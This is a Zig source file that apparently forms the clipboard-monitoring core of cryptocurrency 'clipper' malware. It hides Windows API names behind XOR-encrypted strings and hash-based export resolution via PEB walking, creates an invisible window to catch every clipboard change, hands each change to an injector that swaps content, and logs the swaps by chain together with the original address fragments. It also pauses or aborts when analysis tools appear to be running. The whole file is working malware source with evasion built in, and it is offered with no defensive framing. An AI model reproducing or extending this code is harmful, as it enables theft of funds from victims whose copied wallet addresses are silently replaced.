const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");
const engine = @import("../syscalls/engine.zig");
const process_list = @import("../evasion/process_list.zig");
const scanner = @import("scanner.zig");
const injector = @import("injector.zig");
const log_mod = @import("log.zig");
const clipper_config = @import("clipper_config");

const HWND = types.HANDLE;
const WPARAM = usize;
const LPARAM = isize;
const LRESULT = isize;

const WNDPROC = *const fn (hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) callconv(.winapi) LRESULT;
const WNDCLASSW = extern struct {
    style: u32,
    lpfnWndProc: WNDPROC,
    cbClsExtra: i32,
    cbWndExtra: i32,
    hInstance: types.HANDLE,
    hIcon: ?*anyopaque,
    hCursor: ?*anyopaque,
    hbrBackground: ?*anyopaque,
    lpszMenuName: ?[*:0]const u16,
    lpszClassName: [*:0]const u16,
};

const MSG = extern struct {
    hwnd: HWND,
    message: u32,
    wParam: WPARAM,
    lParam: LPARAM,
    time: u32,
    pt: struct { x: i32, y: i32 },
};

const WM_CLIPBOARDUPDATE: u32 = 0x031D;
const WM_DESTROY: u32 = 0x0002;
const WM_QUIT: u32 = 0x0012;
const CLASS_NAME = [_]u16{ 'C', 'l', 'i', 'p', 'L', 'Z', 0 };
const PROCESS_CHECK_INTERVAL: u32 = 50;

const E = struct {
    pub const user32 = hash.xorEncrypt("user32.dll");
    pub const register_class = hash.xorEncrypt("RegisterClassW");
    pub const create_window = hash.xorEncrypt("CreateWindowExW");
    pub const destroy_window = hash.xorEncrypt("DestroyWindow");
    pub const def_window_proc = hash.xorEncrypt("DefWindowProcW");
    pub const dispatch_message = hash.xorEncrypt("DispatchMessageW");
    pub const translate_message = hash.xorEncrypt("TranslateMessage");
    pub const add_clip_fmt = hash.xorEncrypt("AddClipboardFormatListener");
    pub const remove_clip_fmt = hash.xorEncrypt("RemoveClipboardFormatListener");
    pub const get_message = hash.xorEncrypt("GetMessageW");
    pub const post_quit = hash.xorEncrypt("PostQuitMessage");
    pub const get_module_handle = hash.xorEncrypt("GetModuleHandleW");
};

const WindowApi = struct {
    register_class: *const fn (wc: *const WNDCLASSW) callconv(.winapi) u16,
    create_window: *const fn (ex_style: u32, class: [*:0]const u16, title: [*:0]const u16, style: u32, x: i32, y: i32, w: i32, h: i32, parent: HWND, menu: ?*anyopaque, instance: types.HANDLE, param: ?*anyopaque) callconv(.winapi) HWND,
    destroy_window: *const fn (hwnd: HWND) callconv(.winapi) types.BOOL,
    def_window_proc: *const fn (hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) callconv(.winapi) LRESULT,
    dispatch_message: *const fn (msg: *const MSG) callconv(.winapi) LRESULT,
    translate_message: *const fn (msg: *const MSG) callconv(.winapi) types.BOOL,
    add_clip_fmt: *const fn (hwnd: HWND) callconv(.winapi) types.BOOL,
    remove_clip_fmt: *const fn (hwnd: HWND) callconv(.winapi) types.BOOL,
    get_message: *const fn (msg: *MSG, hwnd: HWND, filter_min: u32, filter_max: u32) callconv(.winapi) types.BOOL,
    post_quit: *const fn (exit_code: i32) callconv(.winapi) void,
    get_module_handle: *const fn (name: ?[*:0]const u16) callconv(.winapi) types.HANDLE,
};

var g_api: ?WindowApi = null;
var g_log: ?*log_mod.ClipperLog = null;
var g_hwnd: ?HWND = null;
var g_check_counter: u32 = 0;
var g_paused: bool = false;

fn resolveWindowApi(user32_mod: types.PVOID) ?WindowApi {
    var buf: [64]u8 = undefined;

    hash.xorDecrypt(&E.register_class, &buf[0..E.register_class.len]);
    const rc = @as(*const fn (wc: *const WNDCLASSW) callconv(.winapi) u16, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.register_class.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.create_window, &buf[0..E.create_window.len]);
    const cw = @as(*const fn (ex_style: u32, class: [*:0]const u16, title: [*:0]const u16, style: u32, x: i32, y: i32, w: i32, h: i32, parent: HWND, menu: ?*anyopaque, instance: types.HANDLE, param: ?*anyopaque) callconv(.winapi) HWND, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.create_window.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.destroy_window, &buf[0..E.destroy_window.len]);
    const dw = @as(*const fn (hwnd: HWND) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.destroy_window.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.def_window_proc, &buf[0..E.def_window_proc.len]);
    const dwp = @as(*const fn (hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) callconv(.winapi) LRESULT, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.def_window_proc.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.dispatch_message, &buf[0..E.dispatch_message.len]);
    const dmsg = @as(*const fn (msg: *const MSG) callconv(.winapi) LRESULT, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.dispatch_message.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.translate_message, &buf[0..E.translate_message.len]);
    const tmsg = @as(*const fn (msg: *const MSG) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.translate_message.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.add_clip_fmt, &buf[0..E.add_clip_fmt.len]);
    const acf = @as(*const fn (hwnd: HWND) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.add_clip_fmt.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.remove_clip_fmt, &buf[0..E.remove_clip_fmt.len]);
    const rcf = @as(*const fn (hwnd: HWND) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.remove_clip_fmt.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.get_message, &buf[0..E.get_message.len]);
    const gm = @as(*const fn (msg: *MSG, hwnd: HWND, filter_min: u32, filter_max: u32) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.get_message.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.post_quit, &buf[0..E.post_quit.len]);
    const pq = @as(*const fn (exit_code: i32) callconv(.winapi) void, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.post_quit.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.get_module_handle, &buf[0..E.get_module_handle.len]);
    const gmh = @as(*const fn (name: ?[*:0]const u16) callconv(.winapi) types.HANDLE, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.get_module_handle.len], 27)) orelse return null)));

    return WindowApi{
        .register_class = rc,
        .create_window = cw,
        .destroy_window = dw,
        .def_window_proc = dwp,
        .dispatch_message = dmsg,
        .translate_message = tmsg,
        .add_clip_fmt = acf,
        .remove_clip_fmt = rcf,
        .get_message = gm,
        .post_quit = pq,
        .get_module_handle = gmh,
    };
}

fn wndProc(hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) callconv(.winapi) LRESULT {
    switch (msg) {
        WM_CLIPBOARDUPDATE => {
            if (g_paused) return 0;
            g_check_counter += 1;
            if (g_check_counter >= PROCESS_CHECK_INTERVAL) {
                g_check_counter = 0;
                if (process_list.isSuspiciousProcessRunning()) {
                    g_paused = true;
                    return 0;
                }
            }
            if (injector.onClipboardChange(std.heap.page_allocator)) |record| {
                if (g_log) |log| {
                    const now_ms = @as(i64, @bitCast(std.time.milliTimestamp()));
                    const entry = log_mod.SwapEntry{
                        .timestamp = now_ms,
                        .chain = record.chain,
                        .original_prefix = record.original_prefix,
                        .original_suffix = record.original_suffix,
                        .format = record.format,
                    };
                    log.addSwap(entry);
                }
            }
            return 0;
        },
        WM_DESTROY => {
            if (g_api) |api| {
                api.post_quit(0);
            }
            return 0;
        },
        else => {
            if (g_api) |api| {
                return api.def_window_proc(hwnd, msg, wparam, lparam);
            }
            return 0;
        },
    }
}

fn threadMain() void {
    const user32_hash = hash.encryptedHashModule(&E.user32);
    const user32_mod = peb_walk.getModuleByHash(user32_hash) orelse return;

    const api = resolveWindowApi(user32_mod) orelse return;
    g_api = api;

    for (0..30) |_| {
        if (!process_list.isSuspiciousProcessRunning()) break;
        const interval: types.LARGE_INTEGER = -@as(types.LARGE_INTEGER, @intCast(2000 * 10000));
        _ = engine.NtDelayExecution(0, @as(*types.LARGE_INTEGER, @constCast(&interval)));
    } else {
        return;
    }

    const wc = WNDCLASSW{
        .style = 0,
        .lpfnWndProc = wndProc,
        .cbClsExtra = 0,
        .cbWndExtra = 0,
        .hInstance = api.get_module_handle(null),
        .hIcon = null,
        .hCursor = null,
        .hbrBackground = null,
        .lpszMenuName = null,
        .lpszClassName = CLASS_NAME,
    };

    if (api.register_class(&wc) == 0) return;

    const hwnd = api.create_window(0, CLASS_NAME, CLASS_NAME, 0, 0, 0, 0, 0, null, null, api.get_module_handle(null), null);
    if (hwnd == null) return;
    g_hwnd = hwnd;

    _ = api.add_clip_fmt(hwnd);

    var msg: MSG = undefined;
    while (api.get_message(&msg, null, 0, 0) != 0) {
        _ = api.translate_message(&msg);
        _ = api.dispatch_message(&msg);
    }

    _ = api.remove_clip_fmt(hwnd);
    _ = api.destroy_window(hwnd);
    g_hwnd = null;
}

pub fn start(log: *log_mod.ClipperLog) !void {
    g_log = log;
    g_paused = false;
    g_check_counter = 0;
    const thread = try std.Thread.spawn(.{}, threadMain, .{});
    thread.detach();
}

pub fn getLog() ?*log_mod.ClipperLog {
    return g_log;
}
